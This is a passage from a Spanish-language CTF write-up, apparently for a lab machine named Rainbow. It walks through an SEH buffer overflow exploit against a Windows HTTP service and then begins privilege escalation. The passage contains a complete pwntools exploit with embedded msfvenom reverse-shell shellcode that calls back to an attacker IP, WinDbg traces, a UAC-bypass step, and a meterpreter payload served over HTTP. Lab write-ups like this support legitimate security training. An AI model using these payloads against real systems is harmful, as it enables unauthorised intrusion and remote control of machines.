+</span><span class="ro">0x00409569</span><span class="p">:</span><span class="am"> pop</span><span class="p"> esi</span><span class="az">; </span><span class="am">pop</span><span class="p"> ebp</span><span class="az">; </span><span class="am">ret</span><span class="az">;
+</span><span class="ro">0x00409657</span><span class="p">:</span><span class="am"> pop</span><span class="p"> esi</span><span class="az">; </span><span class="am">pop</span><span class="p"> ebp</span><span class="az">; </span><span class="am">ret</span><span class="az">;
+</span><span class="ro">0x00409add</span><span class="p">:</span><span class="am"> pop</span><span class="p"> esi</span><span class="az">; </span><span class="am">pop</span><span class="p"> ebx</span><span class="az">; </span><span class="am">ret</span><span class="az">;
+</span><span class="ro">0x00409b09</span><span class="p">:</span><span class="am"> pop</span><span class="p"> esi</span><span class="az">; </span><span class="am">pop</span><span class="p"> ebx</span><span class="az">; </span><span class="am">ret</span><span class="az">;
+</span><span class="ro">0x00409b81</span><span class="p">:</span><span class="am"> pop</span><span class="p"> esi</span><span class="az">; </span><span class="am">pop</span><span class="p"> ebp</span><span class="az">; </span><span class="am">ret</span><span class="az">;
+</span><span class="ro">0x0040165c</span><span class="p">:</span><span class="am"> add</span><span class="p"> esp, 4</span><span class="az">;</span><span class="am"> pop</span><span class="p"> ebp</span><span class="az">; </span><span class="am">ret</span><span class="az">;  
+</span><span class="ro">0x00403ffc</span><span class="p">:</span><span class="am"> add</span><span class="p"> esp, 4</span><span class="az">;</span><span class="am"> pop</span><span class="p"> ebp</span><span class="az">; </span><span class="am">ret</span><span class="az">;  
+</span><span class="ro">0x004061bc</span><span class="p">:</span><span class="am"> add</span><span class="p"> esp, 4</span><span class="az">;</span><span class="am"> pop</span><span class="p"> ebp</span><span class="az">; </span><span class="am">ret</span><span class="az">;  
+</span><span class="ro">0x004080ec</span><span class="p">:</span><span class="am"> add</span><span class="p"> esp, 4</span><span class="az">;</span><span class="am"> pop</span><span class="p"> ebp</span><span class="az">; </span><span class="am">ret</span><span class="az">;  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Cambiamos el valor del <code class="language-plaintext highlighter-rouge">seh</code> y al corromperse el programa ahora la excepción apunta al <code class="language-plaintext highlighter-rouge">pop; pop; ret;</code>, establecemos un breakpoint en el controlador de excepciones</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">seh</span><span class="o"> =</span><span class="p"> p32(</span><span class="mi">0x004091b7</span><span class="p">)</span><span class="c1"> # pop; pop; ret;  </span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">0:000></span><span class="p"> g
+(2c68.c58): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=fffffffc ebx=006e4e40 ecx=41414141 edx=00000004 esi=004020c0 edi=006e4e40
+eip=00406156 esp=00acf8c8 ebp=00acf8d8 iopl=0         nv up ei pl nz na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206
+Rainbow+0x6156:
+00406156 8b1401          mov     edx,dword ptr [ecx+eax] ds:002b:4141413d=????????  
+
+</span><span class="ro">0:000></span><span class="p"> !exchain
+00acf8e8: Rainbow+a040 (0040a040)
+00acf928: Rainbow+a040 (0040a040)
+00acfbe8: Rainbow+91b7 (004091b7)
+Invalid exception stack at 42424242
+
+</span><span class="ro">0:000></span><span class="p"> bp 0x004091b7</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al llegar al breakpoint y ejecutar el <code class="language-plaintext highlighter-rouge">pop; pop; ret;</code> ejecutará el valor del <code class="language-plaintext highlighter-rouge">nseh</code> como opcode, en este caso el byte <code class="language-plaintext highlighter-rouge">0x42</code> se traduce a la instrucción <code class="language-plaintext highlighter-rouge">inc edx</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">0:000></span><span class="p"> g
+Breakpoint 0 hit
+eax=00000000 ebx=00000000 ecx=004091b7 edx=77809de0 esi=00000000 edi=00000000  
+eip=004091b7 esp=00acf310 ebp=00acf330 iopl=0         nv up ei pl zr na pe nc  
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246  
+Rainbow+0x91b7:
+004091b7 5f              pop     edi
+
+</span><span class="ro">0:000></span><span class="p"> pt
+eax=00000000 ebx=00000000 ecx=004091b7 edx=77809de0 esi=00acf410 edi=77809dc2  
+eip=004091b9 esp=00acf318 ebp=00acf330 iopl=0         nv up ei pl zr na pe nc  
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246  
+Rainbow+0x91b9:
+004091b9 c3              ret
+
+</span><span class="ro">0:003></span><span class="p"> p
+eax=00000000 ebx=00000000 ecx=004091b7 edx=77809de0 esi=00acf410 edi=77809dc2  
+eip=00acfbe8 esp=00acf31c ebp=00acf330 iopl=0         nv up ei pl zr na pe nc  
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246  
+00acfbe8 42              inc     edx
+
+</span><span class="ro">0:000></span><span class="p"> u eip L4
+00acfbe8 42              inc     edx
+00acfbe9 42              inc     edx
+00acfbea 42              inc     edx
+00acfbeb 42              inc     edx</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Tenemos un pequeño problema, como la dirección del <code class="language-plaintext highlighter-rouge">pop; pop; ret;</code> contiene un byte <code class="language-plaintext highlighter-rouge">00</code> lo que se escribe después de el controlador <code class="language-plaintext highlighter-rouge">seh</code> no lo vemos reflejado, las <code class="language-plaintext highlighter-rouge">D's</code> no se escribirán en memoria por lo que ahí no podemos escribir un shellcode</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">0:000></span><span class="p"> dds eip L8
+00acfbe8  42424242
+00acfbec  004091b7 Rainbow+0x91b7  
+00acfbf0  00000005
+00acfbf4  00acfef4
+00acfbf8  004026b3 Rainbow+0x26b3  
+00acfbfc  006e6488
+00acfc00  006e64e8
+00acfc04  006e64e8</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podriamos pensar en retroceder al inicio del shellcode sin embargo un short jump hacia atrás de <code class="language-plaintext highlighter-rouge">0x294</code> o <code class="language-plaintext highlighter-rouge">660</code> bytes no cabe en el dword del <code class="language-plaintext highlighter-rouge">nseh</code>, entonces lo que podemos hacer es saltar <code class="language-plaintext highlighter-rouge">5</code> bytes atrás que es el peso del opcode de salto donde guardaremos otro short jump de <code class="language-plaintext highlighter-rouge">655</code> o <code class="language-plaintext highlighter-rouge">0x28f</code> bytes hacia el inicio del shellcode</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3</span><span class="p"> -q
+>>> from pwn import asm
+>>> len(asm("jmp $-0x294"))  
+5
+>>> len(asm("jmp $-0x5"))
+2
+>>> hex(660 - 5)
+'0x28f'
+>>></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Entonces nuestro exploit escribe <code class="language-plaintext highlighter-rouge">A's</code> hasta <code class="language-plaintext highlighter-rouge">5</code> bytes antes de llegar al offset, ahi escribimos el shellcode y luego la estructura, el controlador salta al siguiente <code class="language-plaintext highlighter-rouge">nseh</code> que hace un salto corto hacia el otro salto que salta al inicio del buffer enviado</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> remote, p32, asm
+
+back</span><span class="o"> =</span><span class="p"> asm(</span><span class="s">"jmp $-0x28f"</span><span class="p">)
+
+offset</span><span class="o"> =</span><span class="mi"> 660</span><span class="p">
+junk</span><span class="o"> =</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="p"> (offset</span><span class="o"> -</span><span class="no"> len</span><span class="p">(back))
+
+nseh</span><span class="o"> =</span><span class="p"> asm(</span><span class="s">"jmp $-5"</span><span class="p">).ljust(</span><span class="mi">4</span><span class="p">,</span><span class="no"> b</span><span class="s">"A"</span><span class="p">)
+seh</span><span class="o"> =</span><span class="p"> p32(</span><span class="mi">0x004091b7</span><span class="p">)</span><span class="c1"> # pop; pop; ret;</span><span class="p">
+
+payload</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> junk
+payload</span><span class="o"> +=</span><span class="p"> back
+payload</span><span class="o"> +=</span><span class="p"> nseh</span><span class="o"> +</span><span class="p"> seh
+
+content</span><span class="o"> =</span><span class="no"> b</span><span class="s">"POST / HTTP/1.1</span><span class="mi">\r\n</span><span class="s">" </span><span class="o">+ </span><span class="p">payload  
+
+shell</span><span class="o"> =</span><span class="p"> remote(</span><span class="s">"192.168.100.5"</span><span class="p">,</span><span class="mi"> 8080</span><span class="p">)
+shell.send(content)
+shell.interactive()</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora al ejecutarlo el <code class="language-plaintext highlighter-rouge">nseh</code> tiene el valor del opcode, establecemos un breakpoint</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">0:000></span><span class="p"> g
+(770.2150): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=fffffffc ebx=004e58d8 ecx=41414141 edx=00000004 esi=004020c0 edi=004e58d8
+eip=00406156 esp=00d0f8c8 ebp=00d0f8d8 iopl=0         nv up ei pl nz na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206
+Rainbow+0x6156:
+00406156 8b1401          mov     edx,dword ptr [ecx+eax] ds:002b:4141413d=????????  
+
+</span><span class="ro">0:000></span><span class="p"> !exchain
+00d0f8e8: Rainbow+a040 (0040a040)
+00d0f928: Rainbow+a040 (0040a040)
+00d0fbe8: Rainbow+91b7 (004091b7)
+Invalid exception stack at 4141f9eb
+
+</span><span class="ro">0:000> </span><span class="p">bp 004091b7</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al ejecutar el gadget de <code class="language-plaintext highlighter-rouge">pop; pop; ret;</code> ejecuta un salto corto de <code class="language-plaintext highlighter-rouge">5</code> bytes atrás</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">0:000></span><span class="p"> g
+Breakpoint 1 hit
+eax=00000000 ebx=00000000 ecx=004091b7 edx=77809de0 esi=00000000 edi=00000000
+eip=004091b7 esp=00d0f310 ebp=00d0f330 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
+Rainbow+0x91b7:
+004091b7 5f              pop     edi
+
+</span><span class="ro">0:000></span><span class="p"> pt
+eax=00000000 ebx=00000000 ecx=004091b7 edx=77809de0 esi=00d0f410 edi=77809dc2
+eip=004091b9 esp=00d0f318 ebp=00d0f330 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
+Rainbow+0x91b9:
+004091b9 c3              ret
+
+</span><span class="ro">0:000></span><span class="p"> p
+eax=00000000 ebx=00000000 ecx=004091b7 edx=77809de0 esi=00d0f410 edi=77809dc2  
+eip=00d0fbe8 esp=00d0f31c ebp=00d0f330 iopl=0         nv up ei pl zr na pe nc  
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246  
+00d0fbe8 ebf9            jmp     00d0fbe3</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Si ejecutamos ese salto corto ahora ejecuta otro salto que es hacia el inicio del shellcode, lo comprobamos mirando los bytes con <code class="language-plaintext highlighter-rouge">db</code>, un byte antess no hay <code class="language-plaintext highlighter-rouge">A's</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">0:000></span><span class="p"> p
+eax=00000000 ebx=00000000 ecx=004091b7 edx=77809de0 esi=00d0f410 edi=77809dc2
+eip=00d0fbe3 esp=00d0f31c ebp=00d0f330 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
+00d0fbe3 e96cfdffff      jmp     00d0f954
+
+</span><span class="ro">0:000></span><span class="p"> p
+eax=00000000 ebx=00000000 ecx=004091b7 edx=77809de0 esi=00d0f410 edi=77809dc2  
+eip=00d0f954 esp=00d0f31c ebp=00d0f330 iopl=0         nv up ei pl zr na pe nc  
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246  
+00d0f954 41              inc     ecx
+
+</span><span class="ro">0:000></span><span class="p"> db eip - 1
+00d0f953  00 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  .AAAAAAAAAAAAAAA
+00d0f963  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+00d0f973  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+00d0f983  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+00d0f993  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+00d0f9a3  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+00d0f9b3  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+00d0f9c3  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ya que podemos ejecutar un shellcode con este exploit solo nos queda generar un nuevo shellcode usando <code class="language-plaintext highlighter-rouge">msfvenom</code> que envie una reverse shell por el puerto <code class="language-plaintext highlighter-rouge">443</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ msfvenom </span><span class="p">-p windows/shell_reverse_tcp LHOST=10.8.0.10 LPORT=443 -b </span><span class="am">'\x00\x0a\x0d'</span><span class="p"> -f python -v shellcode -e x86/jmp_call_additive  
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+Found 1 compatible encoders
+Attempting to encode payload with 1 iterations of x86/jmp_call_additive
+x86/jmp_call_additive succeeded with size 353 (iteration=0)
+x86/jmp_call_additive chosen with final size 353
+Payload size: 353 bytes
+Final size of python file: 1990 bytes
+shellcode =  b""
+shellcode += b"\xfc\xbb\x43\x27\xd3\x9f\xeb\x0c\x5e\x56\x31"
+shellcode += b"\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef"
+shellcode += b"\xff\xff\xff\xbf\xcf\x51\x9f\x3f\x10\x36\x29"
+shellcode += b"\xda\x21\x76\x4d\xaf\x12\x46\x05\xfd\x9e\x2d"
+shellcode += b"\x4b\x15\x14\x43\x44\x1a\x9d\xee\xb2\x15\x1e"
+shellcode += b"\x42\x86\x34\x9c\x99\xdb\x96\x9d\x51\x2e\xd7"
+shellcode += b"\xda\x8c\xc3\x85\xb3\xdb\x76\x39\xb7\x96\x4a"
+shellcode += b"\xb2\x8b\x37\xcb\x27\x5b\x39\xfa\xf6\xd7\x60"
+shellcode += b"\xdc\xf9\x34\x19\x55\xe1\x59\x24\x2f\x9a\xaa"
+shellcode += b"\xd2\xae\x4a\xe3\x1b\x1c\xb3\xcb\xe9\x5c\xf4"
+shellcode += b"\xec\x11\x2b\x0c\x0f\xaf\x2c\xcb\x6d\x6b\xb8"
+shellcode += b"\xcf\xd6\xf8\x1a\x2b\xe6\x2d\xfc\xb8\xe4\x9a"
+shellcode += b"\x8a\xe6\xe8\x1d\x5e\x9d\x15\x95\x61\x71\x9c"
+shellcode += b"\xed\x45\x55\xc4\xb6\xe4\xcc\xa0\x19\x18\x0e"
+shellcode += b"\x0b\xc5\xbc\x45\xa6\x12\xcd\x04\xaf\xd7\xfc"
+shellcode += b"\xb6\x2f\x70\x76\xc5\x1d\xdf\x2c\x41\x2e\xa8"
+shellcode += b"\xea\x96\x51\x83\x4b\x08\xac\x2c\xac\x01\x6b"
+shellcode += b"\x78\xfc\x39\x5a\x01\x97\xb9\x63\xd4\x38\xe9"
+shellcode += b"\xcb\x87\xf8\x59\xac\x77\x91\xb3\x23\xa7\x81"
+shellcode += b"\xbc\xe9\xc0\x28\x47\x7a\xe5\xa4\x44\x09\x91"
+shellcode += b"\xb6\x4a\xec\xda\x3e\xac\x84\x0c\x17\x67\x31"
+shellcode += b"\xb4\x32\xf3\xa0\x39\xe9\x7e\xe2\xb2\x1e\x7f"
+shellcode += b"\xad\x32\x6a\x93\x5a\xb3\x21\xc9\xcd\xcc\x9f"
+shellcode += b"\x65\x91\x5f\x44\x75\xdc\x43\xd3\x22\x89\xb2"
+shellcode += b"\x2a\xa6\x27\xec\x84\xd4\xb5\x68\xee\x5c\x62"
+shellcode += b"\x49\xf1\x5d\xe7\xf5\xd5\x4d\x31\xf5\x51\x39"
+shellcode += b"\xed\xa0\x0f\x97\x4b\x1b\xfe\x41\x02\xf0\xa8"
+shellcode += b"\x05\xd3\x3a\x6b\x53\xdc\x16\x1d\xbb\x6d\xcf"
+shellcode += b"\x58\xc4\x42\x87\x6c\xbd\xbe\x37\x92\x14\x7b"
+shellcode += b"\x47\xd9\x34\x2a\xc0\x84\xad\x6e\x8d\x36\x18"
+shellcode += b"\xac\xa8\xb4\xa8\x4d\x4f\xa4\xd9\x48\x0b\x62"
+shellcode += b"\x32\x21\x04\x07\x34\x96\x25\x02\x34\x18\xda"
+shellcode += b"\xad"</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Nuestro exploit final inicia sobrescribiendo el shellcode y rellena con <code class="language-plaintext highlighter-rouge">A's</code> hasta antes de la estructura <code class="language-plaintext highlighter-rouge">SEH</code>, el controlador salta al <code class="language-plaintext highlighter-rouge">nseh</code> haciendo un short jump hacia otro short jump que salta al shellcode ejecutando de esa forma la reverse shell</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> remote, p32, asm
+
+shellcode</span><span class="o"> =</span><span class="no">  b</span><span class="s">""</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xfc\xbb\x43\x27\xd3\x9f\xeb\x0c\x5e\x56\x31</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xff\xff\xff\xbf\xcf\x51\x9f\x3f\x10\x36\x29</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xda\x21\x76\x4d\xaf\x12\x46\x05\xfd\x9e\x2d</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x4b\x15\x14\x43\x44\x1a\x9d\xee\xb2\x15\x1e</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x42\x86\x34\x9c\x99\xdb\x96\x9d\x51\x2e\xd7</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xda\x8c\xc3\x85\xb3\xdb\x76\x39\xb7\x96\x4a</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xb2\x8b\x37\xcb\x27\x5b\x39\xfa\xf6\xd7\x60</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xdc\xf9\x34\x19\x55\xe1\x59\x24\x2f\x9a\xaa</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xd2\xae\x4a\xe3\x1b\x1c\xb3\xcb\xe9\x5c\xf4</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xec\x11\x2b\x0c\x0f\xaf\x2c\xcb\x6d\x6b\xb8</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xcf\xd6\xf8\x1a\x2b\xe6\x2d\xfc\xb8\xe4\x9a</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x8a\xe6\xe8\x1d\x5e\x9d\x15\x95\x61\x71\x9c</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xed\x45\x55\xc4\xb6\xe4\xcc\xa0\x19\x18\x0e</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x0b\xc5\xbc\x45\xa6\x12\xcd\x04\xaf\xd7\xfc</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xb6\x2f\x70\x76\xc5\x1d\xdf\x2c\x41\x2e\xa8</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xea\x96\x51\x83\x4b\x08\xac\x2c\xac\x01\x6b</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x78\xfc\x39\x5a\x01\x97\xb9\x63\xd4\x38\xe9</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xcb\x87\xf8\x59\xac\x77\x91\xb3\x23\xa7\x81</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xbc\xe9\xc0\x28\x47\x7a\xe5\xa4\x44\x09\x91</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xb6\x4a\xec\xda\x3e\xac\x84\x0c\x17\x67\x31</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xb4\x32\xf3\xa0\x39\xe9\x7e\xe2\xb2\x1e\x7f</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xad\x32\x6a\x93\x5a\xb3\x21\xc9\xcd\xcc\x9f</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x65\x91\x5f\x44\x75\xdc\x43\xd3\x22\x89\xb2</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x2a\xa6\x27\xec\x84\xd4\xb5\x68\xee\x5c\x62</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x49\xf1\x5d\xe7\xf5\xd5\x4d\x31\xf5\x51\x39</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xed\xa0\x0f\x97\x4b\x1b\xfe\x41\x02\xf0\xa8</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x05\xd3\x3a\x6b\x53\xdc\x16\x1d\xbb\x6d\xcf</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x58\xc4\x42\x87\x6c\xbd\xbe\x37\x92\x14\x7b</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x47\xd9\x34\x2a\xc0\x84\xad\x6e\x8d\x36\x18</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xac\xa8\xb4\xa8\x4d\x4f\xa4\xd9\x48\x0b\x62</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x32\x21\x04\x07\x34\x96\x25\x02\x34\x18\xda</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xad</span><span class="s">"</span><span class="p">                                          
+
+back</span><span class="o"> =</span><span class="p"> asm(</span><span class="s">"jmp $-0x28f"</span><span class="p">)
+
+offset</span><span class="o"> =</span><span class="mi"> 660</span><span class="p">
+junk</span><span class="o"> =</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="p"> (offset</span><span class="o"> -</span><span class="no"> len</span><span class="p">(shellcode </span><span class="o">+ </span><span class="p">back))
+
+nseh</span><span class="o"> =</span><span class="p"> asm(</span><span class="s">"jmp $-5"</span><span class="p">).ljust(</span><span class="mi">4</span><span class="p">,</span><span class="no"> b</span><span class="s">"A"</span><span class="p">)
+seh</span><span class="o"> =</span><span class="p"> p32(</span><span class="mi">0x004091b7</span><span class="p">)</span><span class="c1"> # pop; pop; ret;</span><span class="p">
+
+payload</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> shellcode
+payload</span><span class="o"> +=</span><span class="p"> junk
+payload</span><span class="o"> +=</span><span class="p"> back
+payload</span><span class="o"> +=</span><span class="p"> nseh</span><span class="o"> +</span><span class="p"> seh
+
+content</span><span class="o"> =</span><span class="no"> b</span><span class="s">"POST / HTTP/1.1</span><span class="mi">\r\n</span><span class="s">" </span><span class="o">+</span><span class="p"> payload
+
+shell</span><span class="o"> =</span><span class="p"> remote(</span><span class="s">"10.10.122.10"</span><span class="p">,</span><span class="mi"> 8080</span><span class="p">)
+shell.send(content)
+shell.interactive()</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Finalmente al ejecutar nuestro exploit de forma remota obtenemos una reverse shell</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3</span><span class="p"> exploit.py
+[</span><span class="ve">+</span><span class="p">] Opening connection to 10.10.122.10 on port 8080: Done  
+[</span><span class="az">*</span><span class="p">] Switching to interactive mode
+</span><span class="ro">$</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo netcat </span><span class="p">-lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 10.10.122.10 51291
+Microsoft Windows [Version 10.0.17763.2452]
+(c) 2018 Microsoft Corporation. All rights reserved.  
+
+C:\rainbow> </span><span class="am">whoami</span><span class="p">
+rainbow\rainbow
+
+C:\rainbow></span>
+</code></pre></div></div><br>
+
+</section>
+<section class="post" id="shell-system">
+<br><h3 class="post-title">Shell - system</h3><br>
+
+<p class="plain-text">El usuario <code class="language-plaintext highlighter-rouge">rainbow</code> como el que recibimos la shell es parte del grupo <code class="language-plaintext highlighter-rouge">Administrators</code> sin embargo al listar los privilegios tenemos muy pocos para ser un administrador</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">C:\rainbow> </span><span class="am">net</span><span class="p"> user rainbow
+net user rainbow
+User name                    rainbow
+Full Name
+Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            1/16/2022 11:55:33 AM
+Password expires             Never
+Password changeable          1/16/2022 11:55:33 AM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   1/6/2025 6:09:18 PM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Administrators       *Users
+Global Group memberships     *None
+The command completed successfully.
+
+C:\rainbow></span><span class="am">whoami </span><span class="p">/priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== ========  
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
+
+C:\rainbow></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para bypassear el <code class="language-plaintext highlighter-rouge">UAC</code> utilizaremos la herramienta <a href="https://github.com/Kudaes/Elevator">elevator</a>, definimos un listener en <code class="language-plaintext highlighter-rouge">msfconsole</code> y creamos un payload para ejecutar dentro de un <code class="language-plaintext highlighter-rouge">.exe</code> con <code class="language-plaintext highlighter-rouge">msfvenom</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ msfvenom</span><span class="p"> -p windows/x64/meterpreter/reverse_tcp LHOST=10.8.0.10 LPORT=4444 -f exe -o shell.exe  
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 510 bytes
+Final size of exe file: 7168 bytes
+Saved as: shell.exe
+
+</span><span class="ve">❯ sudo python3</span><span class="p"> -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo msfconsole </span><span class="p">-q
